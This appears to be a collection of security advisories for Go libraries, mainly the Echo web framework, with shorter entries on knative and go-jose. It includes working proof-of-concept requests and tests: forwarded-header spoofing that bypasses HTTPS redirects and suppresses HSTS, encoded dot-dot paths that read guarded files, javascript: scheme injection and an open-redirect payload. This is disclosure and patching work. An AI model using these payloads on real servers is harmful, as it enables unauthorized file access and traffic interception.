Wrap the request body with http.MaxBytesReader (and add a http.StatusRequestEntityTooLarge branch on the MaxBytesError path):

const maxAdmissionRequestSize = 8 << 20 // 8 MiB — controller-runtime's default; large enough for Kubernetes' own admission objects
r.Body = http.MaxBytesReader(w, r.Body, maxAdmissionRequestSize)
var bodyBuffer bytes.Buffer
review := admissionv1.AdmissionReview{}
if err := json.NewDecoder(io.TeeReader(r.Body, &bodyBuffer)).Decode(&review); err != nil {
    var mbe *http.MaxBytesError
    if errors.As(err, &mbe) {
        http.Error(w, "admission body exceeds maximum size", http.StatusRequestEntityTooLarge)
        return
    }
    http.Error(w, fmt.Sprintf("could not decode body: %v", err), http.StatusBadRequest)
    return
}

This propagates a fix to every downstream consumer with no API change, and the cap can be made configurable per-server via a new field on the webhook.Options struct.

Disclosure

Reporting privately under your security policy. No public disclosure on my side until you have a fix or coordinated timeline. Encourage maintainers to coordinate with downstream consumers (Knative, Tekton, KEDA, Sigstore) on simultaneous release.

Reporter

tonghuaroot (tonghuaroot@gmail.com)

  • https://github.com/knative/pkg/pull/3363
  • https://github.com/knative/pkg/commit/52dbd5ece63fe6d2d340ecbebec160550f460818

Parsing deeply nested JSON structures can hit Go's stack limit, causing the application to crash.

Note: this advisory is the same as https://github.com/go-jose/go-jose/security/advisories/GHSA-6mp9-8xrw-74r4.

Denial of service vulnerability. Any application that parses untrusted JSON via go-jose is exposed.

Reject large inputs before parsing them.

entry.content:
Summary

Decrypting a ciphertext with "A128CBC-HS256", "A192CBC-HS384", or "A256CBC-HS512" can result in a panic on untrusted input.

Note this advisory is the same as https://github.com/go-jose/go-jose/security/advisories/GHSA-6mp9-8xrw-74r4.

Insufficient validation of parameters can lead to attempting to index into an empty buffer. See https://github.com/go-jose/go-jose/pull/292.

If the application does not require the CBC-HMAC modes for content encryption, and is using github.com/go-jose/go-jose/v4, do not include them in the list of ContentEncryption algorithms passed to ParseEncrypted / ParseEncryptedJSON / ParseEncryptedCompact.

Denial of service vulnerability. Any application which decrypts untrusted ciphertexts with the indicated algorithms is affected.

entry.content:
Description

Context.Scheme() unconditionally trusts four client-controlled HTTP headers to determine the request scheme, with no mechanism to configure trusted sources. This allows a remote unauthenticated attacker to bypass HTTPS redirect enforcement and suppress HSTS headers.

The trusted headers (checked in this order of precedence):

  1. X-Forwarded-Proto
  2. X-Forwarded-Protocol
  3. X-Forwarded-Ssl
  4. X-Url-Scheme

Threat model

Scenario A — Directly exposed application (vulnerable by default): The Echo application listens on HTTP and is reachable directly by clients (no L7 proxy in front), or an attacker can bypass the proxy and reach the backend directly. In this case, the attacker has full control over all request headers. Sending X-Forwarded-Proto: https defeats the HTTPSRedirect middleware entirely — traffic stays on plaintext HTTP, enabling man-in-the-middle attacks.

This is the primary scenario. The application is vulnerable by default with no misconfiguration required — simply using e.Pre(middleware.HTTPSRedirect()) as documented is sufficient.

Scenario B — Behind L7 proxy with header sanitization (reduced risk): If the application is strictly behind a correctly configured L7 proxy that always overwrites X-Forwarded-Proto and there is no direct access to the backend, the practical risk is lower. However, this relies on perimeter controls external to the framework, not on the framework itself. As Echo's own IP-extraction documentation states: "you must not trust HTTP headers unconditionally."

Root cause

context.go, lines 161–181:

func (c *Context) Scheme() string {
    if c.IsTLS() {
        return "https"
    }
    if scheme := c.request.Header.Get(HeaderXForwardedProto); scheme != "" {
        return scheme
    }
    if scheme := c.request.Header.Get(HeaderXForwardedProtocol); scheme != "" {
        return scheme
    }
    if ssl := c.request.Header.Get(HeaderXForwardedSsl); ssl == "on" {
        return "https"
    }
    if scheme := c.request.Header.Get(HeaderXUrlScheme); scheme != "" {
        return scheme
    }
    return "http"
}

Two additional issues with this implementation:

  1. No value validation. Scheme() returns any arbitrary string from the header, not just "http" or "https". This breaks the documented contract ("returns the HTTP protocol scheme, http or https") and causes unexpected behavior in middleware that uses the return value to construct URLs (e.g., WWWRedirect builds scheme + "://www." + host + uri).

  2. Consumed by security-critical middleware. The return value is used directly by redirect middleware (middleware/redirect.go:136) and secure middleware (middleware/secure.go:125) for security enforcement decisions.

Affected components

Component File Line(s) Impact
Context.Scheme() context.go 161–181 Returns attacker-controlled scheme
HTTPSRedirect middleware/redirect.go 147–151 HTTPS enforcement bypassed
HTTPSWWWRedirect middleware/redirect.go 154–161 HTTPS enforcement bypassed
HTTPSNonWWWRedirect middleware/redirect.go 163–170 HTTPS enforcement bypassed
WWWRedirect middleware/redirect.go 172–177 URL constructed with arbitrary scheme
NonWWWRedirect middleware/redirect.go 179–184 URL constructed with arbitrary scheme
Secure middleware (HSTS) middleware/secure.go 125 HSTS header suppressed

This is an unsafe-by-default API surface, not just misconfiguration

This behavior is not accidental — it is codified in the project's own test suite. For example, middleware/redirect_test.go (lines 29–34) explicitly asserts that X-Forwarded-Proto: https on an HTTP request results in 200 OK (no redirect):

{
    whenHost:         "labstack.com",
    whenHeader:       map[string][]string{echo.HeaderXForwardedProto: {"https"}},
    expectLocation:   "",
    expectStatusCode: http.StatusOK,
},

Similarly, middleware/secure_test.go (lines 42–53) and context_test.go (lines 1104–1111) assert that scheme is derived from the header.

The problem is not that the framework can use forwarded headers — that is legitimate behind a trusted proxy. The problem is that there is no mechanism to control whether this trust is appropriate, unlike the existing IP header trust model. Scheme() always trusts the headers, making any middleware that depends on it unsafe-by-default.

Inconsistency with existing trust model

Echo already recognizes this class of header-trust vulnerability for IP addresses. The IPExtractor mechanism with TrustOption (TrustLoopback, TrustPrivateNet, TrustLinkLocal, TrustIPRange) was introduced specifically because:

*"you must not trust HTTP headers unconditionally. Otherwise, you might give someone a chance of deceiving you. A security risk!"* — ip.go, lines 20–21

"If you put no proxy (e.g., directly facing the internet), all you need to (and have to) see is IP address from network layer. Any HTTP header is untrustable because the clients have full control what headers to be set." — ip.go, lines 36–38

No equivalent mechanism exists for scheme detection. Scheme() unconditionally trusts all four forwarded headers with no configuration, opt-in, or documentation warning.

Note on proxies and the "3 additional headers"

A correctly configured nginx proxy_set_header X-Forwarded-Proto $scheme; overwrites X-Forwarded-Proto with the actual incoming scheme. When a proxy does this, X-Forwarded-Proto is trustworthy and the three fallback headers (X-Forwarded-Protocol, X-Forwarded-Ssl, X-Url-Scheme) are never reached because X-Forwarded-Proto takes precedence in Scheme().

The three additional headers become real attack vectors specifically when:

  • The proxy does not set X-Forwarded-Proto at all (common in default proxy configs), or
  • The application is directly exposed (Scenario A above).

In such cases, an attacker can bypass via any of the four headers. The main vulnerability (HTTPS redirect bypass via X-Forwarded-Proto on a directly exposed app) does not depend on the additional headers.

Impact

HTTPS downgrade / MITM: An attacker who can reach the Echo HTTP endpoint directly can prevent HTTPS redirection, keeping client traffic on plaintext HTTP and enabling man-in-the-middle attacks.

HSTS suppression: Behind a TLS-terminating proxy, spoofing X-Forwarded-Proto: http prevents the Strict-Transport-Security header from being sent. When the response ultimately reaches the client over HTTPS (via the proxy), the missing HSTS header weakens browser-side HTTPS enforcement. Note: browsers ignore HSTS received over plain HTTP, so the practical risk is specifically in the suppression scenario behind a TLS-terminating proxy, not in injecting HSTS on HTTP.

URL construction with arbitrary scheme: WWWRedirect and NonWWWRedirect use c.Scheme() to build redirect URLs (scheme + "://www." + host + uri). An attacker can inject arbitrary strings (e.g., javascript:, data:) as the scheme component of redirect URLs.

Proof of Concept

Tested on Echo v5.0.4 (commit fa5311b, 2026-02-15).

PoC 1: HTTPS Redirect Bypass (Go test)

package echo_test

import (
    "net/http"
    "net/http/httptest"
    "testing"

    "github.com/labstack/echo/v5"
    "github.com/labstack/echo/v5/middleware"
)

func TestHTTPSRedirectBypass(t *testing.T) {
    e := echo.New()
    e.Pre(middleware.HTTPSRedirect())
    e.GET("/", func(c *echo.Context) error {
        return c.String(http.StatusOK, "served over: "+c.Scheme())
    })

    // Normal HTTP → should redirect
    req := httptest.NewRequest(http.MethodGet, "/", nil)
    rec := httptest.NewRecorder()
    e.ServeHTTP(rec, req)
    if rec.Code != http.StatusMovedPermanently {
        t.Fatalf("expected 301, got %d", rec.Code)
    }
    t.Logf("Normal HTTP → %d (redirect to %s)", rec.Code, rec.Header().Get("Location"))

    // Attack: all 4 headers bypass the redirect
    headers := map[string]string{
        "X-Forwarded-Proto":    "https",
        "X-Forwarded-Protocol": "https",
        "X-Forwarded-Ssl":      "on",
        "X-Url-Scheme":         "https",
    }
    for name, value := range headers {
        req := httptest.NewRequest(http.MethodGet, "/", nil)
        req.Header.Set(name, value)
        rec := httptest.NewRecorder()
        e.ServeHTTP(rec, req)
        if rec.Code == http.StatusOK {
            t.Errorf("BYPASS via %s: %s → %d (no redirect!)", name, value, rec.Code)
        }
    }
}

PoC 2: curl examples (easiest to reproduce)

Start a minimal Echo server:

package main

import (
    "net/http"
    "github.com/labstack/echo/v5"
    "github.com/labstack/echo/v5/middleware"
)

func main() {
    e := echo.New()
    e.Pre(middleware.HTTPSRedirect())
    e.GET("/", func(c *echo.Context) error {
        return c.String(http.StatusOK, "Hello on "+c.Scheme())
    })
    e.Start(":8080")
}

Then:

# Normal HTTP → 301 redirect (expected)
$ curl -I http://localhost:8080/
HTTP/1.1 301 Moved Permanently
Location: https://localhost:8080/

# Attack: bypass via X-Forwarded-Proto
$ curl -H "X-Forwarded-Proto: https" http://localhost:8080/
Hello on https

# Attack: bypass via X-Forwarded-Protocol
$ curl -H "X-Forwarded-Protocol: https" http://localhost:8080/
Hello on https

# Attack: bypass via X-Forwarded-Ssl
$ curl -H "X-Forwarded-Ssl: on" http://localhost:8080/
Hello on https

# Attack: bypass via X-Url-Scheme
$ curl -H "X-Url-Scheme: https" http://localhost:8080/
Hello on https

PoC 3: Arbitrary scheme in redirect URL (WWWRedirect)

func TestArbitrarySchemeInRedirect(t *testing.T) {
    e := echo.New()
    e.Pre(middleware.WWWRedirect())
    e.GET("/", func(c *echo.Context) error {
        return c.String(http.StatusOK, "ok")
    })

    req := httptest.NewRequest(http.MethodGet, "/", nil)
    req.Host = "example.com"
    req.Header.Set("X-Forwarded-Proto", "javascript")
    rec := httptest.NewRecorder()
    e.ServeHTTP(rec, req)

    // Redirect Location uses the spoofed scheme
    loc := rec.Header().Get("Location")
    // loc == "javascript://www.example.com/" — violates http/https contract
    t.Logf("Status: %d, Location: %s", rec.Code, loc)
}

PoC 4: HSTS Suppression

func TestHSTSSuppression(t *testing.T) {
    e := echo.New()
    e.Use(middleware.SecureWithConfig(middleware.SecureConfig{HSTSMaxAge: 31536000}))
    e.GET("/", func(c *echo.Context) error {
        return c.String(http.StatusOK, "ok")
    })

    // Legitimate: proxied HTTPS should have HSTS
    req := httptest.NewRequest(http.MethodGet, "/", nil)
    req.Header.Set("X-Forwarded-Proto", "https")
    rec := httptest.NewRecorder()
    e.ServeHTTP(rec, req)
    if h := rec.Header().Get("Strict-Transport-Security"); h == "" {
        t.Fatal("HSTS missing when it should be present")
    }

    // Attack: suppress HSTS by spoofing "http"
    // In production: app behind TLS-terminating proxy, proxy delivers response
    // to client over HTTPS, but HSTS header is absent due to spoofed header
    req2 := httptest.NewRequest(http.MethodGet, "/", nil)
    req2.Header.Set("X-Forwarded-Proto", "http")
    rec2 := httptest.NewRecorder()
    e.ServeHTTP(rec2, req2)
    if h := rec2.Header().Get("Strict-Transport-Security"); h == "" {
        t.Error("VULNERABLE: HSTS suppressed via X-Forwarded-Proto: http")
    }
}

Test output (all attacks succeed)

=== RUN   TestHTTPSRedirectBypass
    Normal HTTP → 301 (redirect to https://example.com/)
    BYPASS via X-Forwarded-Proto: https → 200 (no redirect!)
    BYPASS via X-Forwarded-Protocol: https → 200 (no redirect!)
    BYPASS via X-Forwarded-Ssl: on → 200 (no redirect!)
    BYPASS via X-Url-Scheme: https → 200 (no redirect!)

=== RUN   TestArbitrarySchemeInRedirect
    Status: 301, Location: javascript://www.example.com/

=== RUN   TestHSTSSuppression
    VULNERABLE: HSTS suppressed via X-Forwarded-Proto: http

Precedent CVEs

  • CVE-2018-1193 — Cloud Foundry GoRouter: unverified X-Forwarded-Proto header trusted for scheme, enabling HTTPS enforcement bypass. Fixed by adding sanitize_forwarded_proto option.
  • CVE-2025-41235 — Spring Cloud Gateway: trusting forwarded headers without explicit proxy configuration, enabling HTTPS redirect bypass. Fixed by requiring trusted proxy configuration.

Suggested fix

Option A: SchemeExtractor (recommended, backward-compatible with opt-in)

Add a SchemeExtractor mechanism analogous to the existing IPExtractor, where the extractor decides whether to trust forwarded headers based on RemoteAddr or trusted proxy ranges:

type SchemeExtractor func(req *http.Request) string

// ExtractSchemeDirect ignores all forwarded headers (secure default)
func ExtractSchemeDirect() SchemeExtractor { ... }

// ExtractSchemeFromXFFHeader trusts X-Forwarded-Proto from trusted sources
func ExtractSchemeFromXFFHeader(options ...TrustOption) SchemeExtractor { ... }

Usage:

// Secure: directly exposed, ignore headers
e.SchemeExtractor = echo.ExtractSchemeDirect()

// Behind trusted proxy
e.SchemeExtractor = echo.ExtractSchemeFromXFFHeader(
    echo.TrustIPRange(proxySubnet),
)

The default should be secure. For backward compatibility, a migration period with deprecation warnings for the legacy behavior may be appropriate.

Option B: Minimal hardening (does NOT fix the bypass, but fixes the contract violation)

Scheme() should validate that the returned value is "http" or "https", rejecting arbitrary strings. This prevents the "arbitrary scheme in redirect URL" issue but does not address the core HTTPS redirect bypass (because "https" is a valid value that the attacker injects).

Both options should be applied together.

Patches

Fixed in github.com/labstack/echo/v5 v5.4.0 and github.com/labstack/echo/v4 v4.16.0. Context.Scheme() now uses the X-Forwarded-Proto, X-Forwarded-Protocol, X-Forwarded-Ssl and X-Url-Scheme headers only when the request comes directly from a loopback, link-local or private network address or a unix socket. When X-Forwarded-Proto is present, only its last value is used. The new Echo#SchemeExtractor selects the strategy (ExtractSchemeFromHeaders, ExtractSchemeDirect, LegacySchemeExtractor). The Secure middleware sets HSTS from Context.Scheme(), and the Proxy middleware always sets X-Forwarded-Proto and removes the other scheme headers.

Workarounds

If a proxy or load balancer connects to your application from a public address, trust its address ranges after upgrading, for example e.SchemeExtractor = echo.ExtractSchemeFromHeaders(echo.TrustIPRange(proxyRange)); otherwise HTTPSRedirect redirects in a loop. If you cannot upgrade, make sure every request passes through a proxy that overwrites X-Forwarded-Proto and removes X-Forwarded-Protocol, X-Forwarded-Ssl and X-Url-Scheme, and that the application cannot be reached directly.

  • https://github.com/labstack/echo/commit/b838391e2eade87ae7e5a09d7bb5087bec271ec1
  • https://github.com/labstack/echo/commit/fc410094b2f3415cf2bf5204082137b205bfd5af

func ExtractSchemeDirect() SchemeExtractor { ... }

// ExtractSchemeFromXFFHeader trusts X-Forwarded-Proto from trusted sources
func ExtractSchemeFromXFFHeader(options ...TrustOption) SchemeExtractor { ... }

    echo.TrustIPRange(proxySubnet),
)

entry.title: [github.com/labstack/echo/v4] Echo static file middleware route protection bypass via encoded dot-dot traversal
entry.content:
Summary

Echo v5.2.0 contains a bypass of the fix for GHSA-vfp3-v2gw-7wfq. The fix rejects encoded path separators such as %2F and %5C before static file path unescaping, but two traversal forms still bypass route-level middleware protections for static files.

The primary bypass uses encoded dot-dot segments. A request such as /public/%2E%2E/admin/secret.txt passes the encoded-separator guard, is unescaped to public/../admin/secret.txt, then path.Clean resolves it to admin/secret.txt. If /admin/* is protected by middleware but the static filesystem is mounted at /, the protected file is returned through the public static route.

A second bypass exists when UseEscapedPathForMatching=true. In that mode, the router normalizes encoded separators before the static handler checks the wildcard. The handler receives a decoded wildcard with no % characters, so the encoded-separator guard does not run on the original encoded path.

Impact

An unauthenticated attacker can read files that an application intended to protect with route-level middleware, when those files are also reachable through a static filesystem mount after path normalization.

The high-severity variant works with the default router configuration and requires only encoded dot-dot path segments. The direct protected route returns 403, while the public static route returns the protected file content.

The UseEscapedPathForMatching=true variant is lower severity because it requires a non-default router configuration.

Affected versions

Tested vulnerable:

  • github.com/labstack/echo/v5 v5.2.0
  • Current master at 5786024ea4d85c01784796e8aa7aac53e007b39b

No patched version is currently known.

Policy and version checks

GitHub Private Vulnerability Reporting is enabled for labstack/echo. The repository has a root SECURITY.md and accepts security reports through GitHub Security Advisories.

The vulnerable code was revalidated on both current master and the latest release tag:

  • Current master: 5786024ea4d85c01784796e8aa7aac53e007b39b
  • Latest release: v5.2.0, published June 14 2026
  • Package: github.com/labstack/echo/v5

The same focused Go tests pass on the checked out v5.2.0 / master commit, proving the bypass remains present in the latest released version and latest main branch at the time of reporting.

Reproduction

The following application shape reproduces the high-severity bypass:

e := echo.New()

g := e.Group("/admin", func(next echo.HandlerFunc) echo.HandlerFunc {
    return func(c echo.Context) error {
        return echo.NewHTTPError(http.StatusForbidden)
    }
})
g.GET("/*", handler)

e.StaticFS("/", fsysWithAdminSecret)

Control request:

GET /admin/secret.txt

Observed result:

403 Forbidden

Bypass request:

GET /public/%2E%2E/admin/secret.txt

Observed result:

200 OK
TOP-SECRET

For the non-default router variant:

e := echo.New()
e.router = echo.NewRouter(echo.RouterConfig{
    UseEscapedPathForMatching: true,
})

g := e.Group("/admin", authMiddlewareReturning403)
g.GET("/*", handler)

e.StaticFS("/", fsysWithAdminSecret)

Bypass request:

GET /public%2F..%2Fadmin%2Fsecret.txt

Observed result:

200 OK
TOP-SECRET

Proof of concept evidence

I added focused tests against the current Echo codebase. The tests exercise both StaticDirectoryHandler and the static middleware path.

Command:

go test -run TestHostile -v ./...

Observed result:

=== RUN   TestHostile_StaticDirectoryHandler_EncodedSeparatorsBlocked
--- PASS: TestHostile_StaticDirectoryHandler_EncodedSeparatorsBlocked (0.00s)
=== RUN   TestHostile_StaticDirectoryHandler_EncodedDotDotBypass
--- PASS: TestHostile_StaticDirectoryHandler_EncodedDotDotBypass (0.00s)
=== RUN   TestHostile_UseEscapedPathForMatching_Bypass
--- PASS: TestHostile_UseEscapedPathForMatching_Bypass (0.00s)
PASS
ok  github.com/labstack/echo/v5  0.013s
=== RUN   TestHostile_StaticMiddleware_EncodedSeparatorsBlocked
--- PASS: TestHostile_StaticMiddleware_EncodedSeparatorsBlocked (0.01s)
=== RUN   TestHostile_StaticMiddleware_EncodedDotDotBypass
--- PASS: TestHostile_StaticMiddleware_EncodedDotDotBypass (0.00s)
=== RUN   TestHostile_StaticMiddleware_DisablePathUnescaping
--- PASS: TestHostile_StaticMiddleware_DisablePathUnescaping (0.00s)
PASS
ok  github.com/labstack/echo/v5/middleware  0.012s

The control tests also confirm that the new fix blocks encoded separators such as %2F, %5C, double-encoded slash values, null bytes, and overlong slash encodings.

Root cause

The fix for GHSA-vfp3 uses a denylist-style guard that checks for encoded path separators before unescaping the static wildcard. This blocks %2F and %5C, but does not block encoded traversal segments such as %2E%2E.

The vulnerable flow is:

  1. The static route wildcard accepts public/%2E%2E/admin/secret.txt.
  2. The encoded-separator guard sees no %2F or %5C and allows the request.
  3. The handler unescapes the wildcard to public/../admin/secret.txt.
  4. path.Clean resolves it to admin/secret.txt.
  5. The file is served through the public static route instead of the protected /admin/* route.

For UseEscapedPathForMatching=true, the router decodes the path before the static handler sees the wildcard, so the handler cannot detect that encoded separators were used in the original request.

Remediation

Do not rely only on detecting encoded separators. Reject encoded traversal sequences before unescaping, and reject normalized wildcard values that cross route or static mount boundaries.

Possible fixes:

  1. Extend the pre-unescape guard to reject encoded dot segments such as %2E and %2E%2E in path components.
  2. After unescaping, reject any wildcard where cleaning changes the path in a way that removes . or .. components.
  3. For UseEscapedPathForMatching=true, run the static-file guard against the original escaped request path before router normalization, or preserve metadata that the matched wildcard came from encoded separators.

Patches

Fixed in github.com/labstack/echo/v5 v5.4.0 and github.com/labstack/echo/v4 v4.16.0. The Static middleware and StaticDirectoryHandler (used by Echo.Static, Echo.StaticFS, Group.Static and Group.StaticFS) no longer serve paths with a ., .. or empty segment, including after path unescaping. The encoded variant of the first vector (/public/%2E%2E/admin/secret.txt) was already fixed in v5.2.1 and v4.15.4 (GHSA-vfp3-v2gw-7wfq).

Workarounds

Put a reverse proxy in front of the application that normalizes request paths (removes dot segments and merges slashes), or keep protected files outside the served directory.

entry.title: [github.com/labstack/echo/v4] Echo has a Static Middleware Double-Unescape Path Traversal
entry.content:
Summary

Commit a9ede66a (PR #3006, issue #2599) silently fixed a path traversal vulnerability in the Echo web framework's static file middleware.

Vulnerability

The static middleware double-unescaped URL paths. Go's net/http already decodes Request.URL.Path, but middleware/static.go unconditionally called url.PathUnescape() again:

// BEFORE (vulnerable)
pathUnescape := true

This reassembled path traversal sequences from double-encoded input. An attacker could send GET /%2e%2e%2fsecret.txt or /..%252fsecret.txt and the double-unescape would produce ../secret.txt.

Fix

// AFTER (fixed)
pathUnescape := false

The commit's test TestStatic_percentEncodedTraversalIsBlocked explicitly verifies traversal vectors are blocked.

Impact

Arbitrary file read from server filesystem via percent-encoded path traversal.

References

  • Fix: https://github.com/labstack/echo/commit/a9ede66a
  • Issue: https://github.com/labstack/echo/issues/2599
  • PR: https://github.com/labstack/echo/pull/3006

Patches

Fixed in github.com/labstack/echo/v5 v5.2.0 and github.com/labstack/echo/v4 v4.15.3, where the Static middleware stopped unescaping an already decoded path. Maintainer analysis: reading files outside the configured root could not be reproduced; the confirmed impact was that a double-encoded slash (%252F) could reach a file under a guarded route when the Static middleware is registered globally. Upgrade to v5.4.0 / v4.16.0 or later, which also includes related fixes for encoded and dot-segment paths.

Keep files that need protection outside the Static middleware's root directory.

entry.title: [github.com/labstack/echo/v4] Echo has Open Redirect via Control-Character Prefix Defeating sanitizeURI
entry.content:
Summary

Echo's dedicated open-redirect guard, sanitizeURI, decides whether a redirect target is a local path by inspecting exactly two byte positions: uri[0] and uri[1]. If the value begins with a control character such as a tab or a newline, followed by a separator pair, the guard does not fire and the value is written to the Location header unchanged.

Browsers remove tab and newline characters from URLs before parsing them, and treat a backslash as a forward slash for HTTP and HTTPS URLs. A Location value of /\t/attacker.example is therefore resolved by the browser as an absolute URL on attacker.example. Confirmed end to end in a headless browser.

Technical background

The guard

middleware/slash.go:144 (duplicated verbatim at echo.go:958):

func sanitizeURI(uri string) string {
    // double slash `\\`, `//` or even `\/` is absolute uri for browsers and by redirecting request to that uri
    // we are vulnerable to open redirect attack. so replace all slashes from the beginning with single slash
    if len(uri) > 1 && (uri[0] == '\\' || uri[0] == '/') && (uri[1] == '\\' || uri[1] == '/') {
        uri = "/" + strings.TrimLeft(uri, `/\`)

entry.title: [github.com/labstack/echo/v4] Echo has Arbitrary Scheme Injection in WWWRedirect/NonWWWRedirect Middlewares via X-Forwarded-Proto
entry.content:
Summary

The c.Scheme() method in Echo (context.go:162-181) trusts the X-Forwarded-Proto, X-Forwarded-Protocol, and X-Url-Scheme request headers without validating that the value is http or https. The WWWRedirect() and NonWWWRedirect() middlewares use this unsanitized scheme to construct redirect URLs, allowing an attacker to inject arbitrary URI schemes into the Location response header.

Affected Components

  • context.go:162-181 - Scheme() method returns attacker-controlled value verbatim
  • middleware/redirect.go:172-184 - redirectWWW/redirectNonWWW use unsanitized scheme

Proof of Concept

GET /path HTTP/1.1
Host: example.com
X-Forwarded-Proto: javascript

Response:
HTTP/1.1 301 Moved Permanently
Location: javascript://www.example.com/path

Confirmed injectable schemes: javascript, data, vbscript, file, ftp, ssh, telnet, gopher.

Only WWWRedirect() and NonWWWRedirect() (and WithConfig variants) are affected. HTTPSRedirect, HTTPSWWWRedirect, HTTPSNonWWWRedirect are NOT affected (they hardcode https://).

Impact

  • Open redirect to arbitrary scheme URLs when app is not behind a proxy that strips X-Forwarded-Proto
  • Cache poisoning when behind a CDN that caches redirect responses keyed by path
  • file:// scheme injection could trigger file access in some browser configurations

Suggested Fix

Whitelist scheme in c.Scheme() to only return http or https:

func (c *Context) Scheme() string {
    if c.IsTLS() {
        return "https"
    }
    if scheme := c.request.Header.Get(HeaderXForwardedProto); scheme != "" {
        scheme = strings.ToLower(strings.TrimSpace(scheme))
        if scheme == "https" {
            return "https"
        }
    }
    return "http"
}

Disclosure

Source code review, manually verified with actual HTTP server. Tested on Echo v5.0.4 (latest master).

Patches

Fixed in github.com/labstack/echo/v5 v5.1.1 and github.com/labstack/echo/v4 v4.15.2. Context.Scheme() now accepts only http, https, ws or wss from the X-Forwarded-Proto, X-Forwarded-Protocol and X-Url-Scheme headers, and falls back to http for any other value (#2953).

Workarounds

Upgrade to a patched version. If you cannot upgrade, have your edge proxy overwrite or remove the X-Forwarded-Proto, X-Forwarded-Protocol and X-Url-Scheme request headers.

References

entry.title: [github.com/labstack/echo/v4] Echo's middleware.Static: `%2F`-encoded path bypasses route/group middleware guarding a statically-served path
entry.content:
Summary

When middleware.Static is mounted globally (e.Use(middleware.Static(...))) and an application relies on a route- or group-level middleware guard to restrict a path that also falls under the served static root, a %2F-encoded request bypasses that guard while the file is still served. This is the same encoding/decoding mismatch fixed for StaticFS/StaticDirectoryHandler in CVE-2026-55677 / GHSA-vfp3-v2gw-7wfq, but the fix did not cover the middleware.Static path. In addition, the StaticConfig.EnablePathUnescaping docstring states the default configuration prevents exactly this bypass, which is inaccurate for the global-mount case.

This is not path traversal: no file outside the static root is accessed. The served file lives inside the static root; the issue is that access-control expectations set by a route guard are inconsistent between the literal and %2F-encoded forms of the same path.

Details

Root cause — the router and the static handler disagree on how to interpret %2F:

  • The router matches routes on the raw, still-encoded path, so GET /admin%2Fsecret.txt does not match a /admin/... route or group; any middleware attached to that route/group is therefore skipped.
  • middleware.Static selects its path source in middleware/static.go (L219): with a global e.Use mount there is no wildcard route, so it uses c.Request().URL.Path, which net/http has already decoded (%2F → /). It then path.Cleans (L235) and Opens (~L259) admin/secret.txt, serving the file.

Net effect: for the literal path the guard runs; for the %2F-encoded path the guard is skipped but the same file is served.

Relevant code:

  • middleware/static.go ~L219 (p := c.Request().URL.Path), ~L235 (path.Clean), ~L259 (currentFS.Open)
  • StaticConfig.EnablePathUnescaping docstring (static.go ~L60-67) — claims the default prevents the /admin%2fprivate.txt → /admin/* guard bypass; this is not true for the global mount.

Relationship to prior advisories:

  • CVE-2026-55677 / GHSA-vfp3-v2gw-7wfq (patched 5.2.0): same %2F router-vs-handler mismatch, but fixed for StaticFS/StaticDirectoryHandler. The middleware.Static path was not covered — this report is that gap.
  • CVE-2026-25766 / GHSA-pgvm-wxw2-hrv9 (patched 5.0.3): a different issue (Windows backslash traversal outside the root). Referenced only to disambiguate; not the same as this report.

PoC

Environment: golang:1.25, module using the official release (go get github.com/labstack/echo/v5@v5.3.1, no local replace). Static root public/ contains a marker file public/admin/secret.txt = SECRET.

Minimal app (the pattern under test: static served globally + a group guard intended to protect /admin):

package main

import (
    "net/http"

    "github.com/labstack/echo/v5"
    "github.com/labstack/echo/v5/middleware"
